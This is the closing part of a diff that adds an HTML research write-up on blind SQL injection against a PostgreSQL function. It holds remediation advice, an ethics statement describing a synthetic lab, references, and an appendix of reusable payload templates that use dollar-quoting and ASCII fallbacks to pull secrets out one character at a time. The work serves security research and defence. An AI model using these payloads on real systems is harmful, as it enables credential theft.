+  <li><strong>Add defense in depth:</strong> API-layer schema validation (Joi/Zod), a WAF (CRS detected these payloads), and per-client rate limits to make the ~15,808-request extraction observable.</li>
+</ol>
+
+<h2 id="ethics">12. Ethical Considerations and Responsible Disclosure</h2>
+<p>All experiments were conducted in an isolated laboratory environment under our own control. The vulnerable function, the <code>secret_vault</code> schema, and every extracted credential were synthetic and created solely for this research; no production system, third-party service, or real user data was accessed. The synthetic secrets are formatted to resemble real API keys for realism but are non-functional, for example, the AWS value is the vendor-documented <code>EXAMPLEKEY</code>.</p>
+<p>The technique targets a developer-introduced anti-pattern, not a vulnerability in PostgreSQL itself, so there is no upstream vendor to notify. We publish it to improve PL/pgSQL code review, WAF rule evaluation, and developer training. Practitioners applying these payloads must do so only against systems they own or are explicitly authorized to test.</p>
+
+<h2 id="refs">13. References</h2>
+<ol>
+  <li>PostgreSQL Global Development Group. <em>PostgreSQL 17 Documentation: String Constants (Dollar-Quoted) and the format() function.</em> <a href="https://www.postgresql.org/docs/17/">postgresql.org/docs/17</a> (accessed 2026-05-29).</li>
+  <li>sqlmap project. <em>Payload definitions, data/xml/payloads/</em>, commit <code>e659543</code>. <a href="https://github.com/sqlmapproject/sqlmap">github.com/sqlmapproject/sqlmap</a> (accessed 2026-05-29).</li>
+  <li>swisskyrepo. <em>PayloadsAllTheThings: SQL Injection (PostgreSQL).</em> <a href="https://github.com/swisskyrepo/PayloadsAllTheThings">github.com/swisskyrepo/PayloadsAllTheThings</a> (accessed 2026-05-29).</li>
+  <li>OWASP Foundation. <em>OWASP Core Rule Set 4.25.0.</em> <a href="https://coreruleset.org/">coreruleset.org</a> (accessed 2026-05-29).</li>
+  <li>OWASP Foundation. <em>SQL Injection Prevention Cheat Sheet.</em> <a href="https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html">cheatsheetseries.owasp.org</a> (accessed 2026-05-29).</li>
+  <li>PortSwigger. <em>SQL injection, Web Security Academy.</em> <a href="https://portswigger.net/web-security/sql-injection">portswigger.net/web-security/sql-injection</a> (accessed 2026-05-29).</li>
+</ol>
+
+<h2 id="appendix">Appendix A: Quick Reference</h2>
+<h3>Payload Template</h3>
+<pre><code>(SELECT substr(COLUMN,POSITION,1) FROM SCHEMA.TABLE WHERE KEY LIKE $_$VALUE$_$) = CHAR</code></pre>
+<h3>ASCII Fallback for Stripped Characters</h3>
+<pre><code>(SELECT ascii(substr(COLUMN,POSITION,1)) FROM SCHEMA.TABLE WHERE KEY LIKE $_$VALUE$_$) = 45</code></pre>
+<h3>URL Encoding</h3>
+<table>
+  <thead><tr><th>Char</th><th>Encoded</th></tr></thead>
+  <tbody>
+    <tr><td><code>$_$</code></td><td><code>%24_%24</code></td></tr>
+    <tr><td><code>=</code></td><td><code>%3D</code></td></tr>
+    <tr><td><code>(</code></td><td><code>%28</code></td></tr>
+    <tr><td><code>)</code></td><td><code>%29</code></td></tr>
+    <tr><td><code>,</code></td><td><code>%2C</code></td></tr>
+    <tr><td><code>/</code></td><td><code>%2F</code></td></tr>
+  </tbody>
+</table>
+<h3>Stripped Character ASCII Codes</h3>
+<table>
+  <thead><tr><th>Char</th><th>ASCII</th></tr></thead>
+  <tbody>
+    <tr><td><code>'</code></td><td>39</td></tr>
+    <tr><td><code>;</code></td><td>59</td></tr>
+    <tr><td><code>-</code></td><td>45</td></tr>
+  </tbody>
+</table>
+
+<footer>
+  <p><strong>Jerry Luong</strong>, Independent Researcher. Documented May 2026. All test data was synthetic; no production systems were accessed without authorization.</p>
+  <p>Licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a>. Source and full materials in this repository.</p>
+</footer>
+
+</div>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script>try{hljs.highlightAll();}catch(e){}</script>
+</body>
+</html>
